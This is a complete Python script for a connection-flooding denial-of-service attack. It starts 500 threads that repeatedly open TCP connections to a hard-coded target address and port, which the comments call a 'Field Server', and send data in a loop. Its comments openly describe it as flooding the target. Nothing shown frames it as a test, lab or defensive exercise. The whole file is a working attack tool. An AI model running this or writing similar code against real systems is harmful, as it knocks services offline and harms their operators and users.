import socket
import threading 
import time
import random

target_ip = "192.168.100.88"  # IP address of the target.
target_port = 5103  # Field Server port number.

def flood():  # Function for flooding the target.
    while True:  # Loop to send continuous requests.
        try:  # Attempt to send data.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket.
            s.connect((target_ip, target_port))  # Connect to the target.
            s.sendall(b"Connecting . . .")  # Send data to the target.
            s.close()  # Close the socket.
            time.sleep(random.uniform(0.1, 0.5))  # Wait a random time (0.1–0.5 seconds).
        except Exception as e:  # Handle connection errors.
            print(f"Connection failed: {e}")  # Print the error message.
            break  # Exit the loop on error.

num_threads = 500  # Number of threads to create.

threads = []  # List to store thread objects.
for i in range(num_threads):  # Loop to create threads.
    t = threading.Thread(target=flood)  # Create a thread for the flood function.
    threads.append(t)  # Add thread to the list.
    t.start()  # Start the thread.

for t in threads:  # Loop through all threads.
    t.join()  # Wait for all threads to finish.
